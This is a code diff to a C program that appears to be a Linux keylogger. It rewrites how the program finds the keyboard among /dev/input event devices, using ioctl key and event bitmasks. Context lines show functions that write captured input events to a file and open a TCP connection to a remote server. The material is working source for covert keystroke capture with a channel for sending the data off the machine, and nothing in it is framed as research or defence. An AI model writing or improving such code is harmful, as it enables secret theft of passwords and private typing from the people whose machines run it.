@@ -1,5 +1,4 @@
-/* Developed by Fabio Cinicolo */
-
+#define _XOPEN_SOURCE 700
 #include <stdlib.h>
 #include <stdio.h>
 #include <fcntl.h>
@@ -74,104 +73,106 @@ int writeEventsIntoFile(int fd, struct input_event *events, size_t to_write)
     return 1;
 }
 
-int *findKeyboards(char *path, int *num_keyboards)
+int keyboardFound(char *path, int *keyboard_fd)
 {
     DIR *dir = opendir(path);
     if (dir == NULL)
-    {
-        perror("Unable to open directory");
-        *num_keyboards = 0;
-        return NULL;
-    }
-
-    struct dirent *file;
-    int max_keyboards = 2;
-    int *keyboards = malloc(max_keyboards * sizeof(int));
-    int num_found = 0;
-
-    while ((file = readdir(dir)) != NULL)
-    {
-        if (strncmp(file->d_name, "event", 5) == 0)
-        {
-            char file_path[267];
-            snprintf(file_path, sizeof(file_path), "/dev/input/%s", file->d_name);
-
-            int fd = open(file_path, O_RDONLY);
-            if (fd > -1 && isKeyboardDevice(fd))
-            {
-                keyboards[num_found++] = fd;
-                if (num_found == max_keyboards)
-                {
-                    max_keyboards *= 2;
-                    keyboards = realloc(keyboards, max_keyboards * sizeof(int));
-                }
-            }
-            else
-                close(fd);
-        }
-    }
-    closedir(dir);
-    *num_keyboards = num_found;
-    return keyboards;
-}
-
-int findRealKeyboard(int *keyboards, int num_keyboards, int timeout, int *keyboard)
-{
-
-    struct pollfd fds[num_keyboards];
-    size_t event_size = sizeof(event);
-    event *kbd_events = malloc(event_size * MAX_EVENTS);
-
-    if (keyboards == NULL || num_keyboards <= 0)
         return 0;
 
-    for (int i = 0; i < num_keyboards; i++)
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL)
     {
-        fds[i].events = POLLIN;
-        fds[i].fd = keyboards[i];
-    }
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue; /* Skip current directory and parent directory entries. */
 
-    while (1)
-    {
-        int ready = poll(fds, num_keyboards, timeout);
-        if (ready < 0) // timeout seconds passed or poll failed, we assume keyboards were all false positives
-            return 0;
-        else
+        char filepath[320];
+        snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);
+        struct stat file_stat;
+        if (stat(filepath, &file_stat) == -1)
         {
-            for (int i = 0; i < num_keyboards; i++)
-            {
-                if (fds[i].revents & POLLIN)
-                {
-                    ssize_t r;
-                    r = read(fds[i].fd, kbd_events, event_size * MAX_EVENTS);
-                    if (r < 0)
-                        return 0;
+            perror("Error getting file information");
+            continue;
+        }
 
-                    for (size_t j = 0; j < r / event_size; j++)                                        /* For each event read */
-                        if (kbd_events[j].type == EV_KEY && kbd_events[j].value == KEY_PRESSED)        /* If a key has been pressed.. */
-                            if (kbd_events[j].code >= KEY_RESERVED && kbd_events[j].code <= KEY_WIMAX) /* And it is a key of a legit keyboard (not a key of a gaming mouse or a joypad, for example)*/
-                            {
-                                *keyboard = fds[i].fd;
-                                return 1;
-                            }
-                }
+        if (S_ISDIR(file_stat.st_mode))
+        {
+            /* If the entry is a directory, recursively search it. */
+            if (keyboardFound(filepath, keyboard_fd))
+            {
+                closedir(dir);
+                return 1; /* Return true if the keyboard device is found in a subdirectory. */
             }
         }
+        else
+        {
+            int fd = open(filepath, O_RDWR);
+            int keys_to_check[] = {KEY_Q, KEY_W, KEY_E, KEY_R, KEY_T, KEY_Y, KEY_BACKSPACE, KEY_ENTER, KEY_0, KEY_1, KEY_2, KEY_ESC};
+            if (!supportsRelativeMovement(fd) && supportsSpecificKeys(fd, keys_to_check, 12))
+            {
+                closedir(dir);
+                *keyboard_fd = fd;
+                return 1; /* Return true if the keyboard device is found. */
+            }
+            close(fd);
+        }
     }
-    return 0;
+
+    closedir(dir);
+    return 0; /* Keyboard device not found in the directory and its subdirectories. */
 }
 
-int isKeyboardDevice(int fd)
+/* Returns true iff the given device has keys.
+int supportsKeys(int fd)
 {
-    int32_t events_bitmask = 0;
-    int32_t keys_bitmask = 0;
-    int32_t keys = KEY_Q | KEY_A | KEY_Z | KEY_1 | KEY_9;
 
-    if (ioctl(fd, EVIOCGBIT(0, sizeof(events_bitmask)), &events_bitmask) >= 0)          /* Getting bit events supported by device */
-        if ((events_bitmask & EV_KEY) == EV_KEY)                                        /* If EV_KEY bit is set then it could be a keyboard, but it can be a false positive (for example, power button has this bit set but it is not a kbd) */
-            if (ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(keys_bitmask)), &keys_bitmask) >= 0) /* If it support those keys then we found a device that acts as a keyboard */
-                return (keys & keys_bitmask) == keys ? 1 : 0;
-    return 0;
+    unsigned long evbit = 0;
+
+    // Get the bit field of available event types.
+    ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);
+
+    // Check if EV_KEY is set.
+    return (evbit & (1 << EV_KEY));
+} */
+
+int supportsRelativeMovement(int fd)
+{
+
+    unsigned long evbit = 0;
+
+    /* Get the bit field of available event types. */
+    ioctl(fd, EVIOCGBIT(0, sizeof(evbit)), &evbit);
+
+    /* Check if EV_REL is set. */
+    return (evbit & (1 << EV_REL));
+}
+
+/* Returns true iff the given device supports $key.
+int HasSpecificKey(int device_fd, unsigned int key)
+{
+    size_t nchar = KEY_MAX / 8 + 1;
+    unsigned char bits[nchar];
+    // Get the bit fields of available keys.
+    ioctl(device_fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);
+    return bits[key / 8] & (1 << (key % 8));
+} */
+
+/* Returns true iff the given device supports $keys. */
+int supportsSpecificKeys(int fd, int *keys, size_t num_keys)
+{
+
+    size_t nchar = KEY_MAX / 8 + 1;
+    unsigned char bits[nchar];
+
+    /* Get the bit fields of available keys. */
+    ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(bits)), &bits);
+
+    for (size_t i = 0; i < num_keys; ++i)
+    {
+        int key = keys[i];
+        if (!(bits[key / 8] & (1 << (key % 8))))
+            return 0; /* At least one key is not supported */
+    }
+    return 1; /* All keys are supported. */
 }
 
 int openConnectionWithServer(char *ip, short port)
@@ -187,12 +188,11 @@ int openConnectionWithServer(char *ip, short port)
     if (sock_fd < 0)
         return 0;
 
-    bzero(&server, sizeof(server));
+    memset(&server, 0, sizeof(server));
 
     server.sin_family = AF_INET;
-    server.sin_addr = *((struct in_addr *)host_info->h_addr);
+    server.sin_addr.s_addr = *((unsigned long *)host_info->h_addr_list[0]);
     server.sin_port = htons(port);
-
     if (connect(sock_fd, (struct sockaddr *)&server, sizeof(server)) < 0) /* Connecting to server */
         return 0;
 
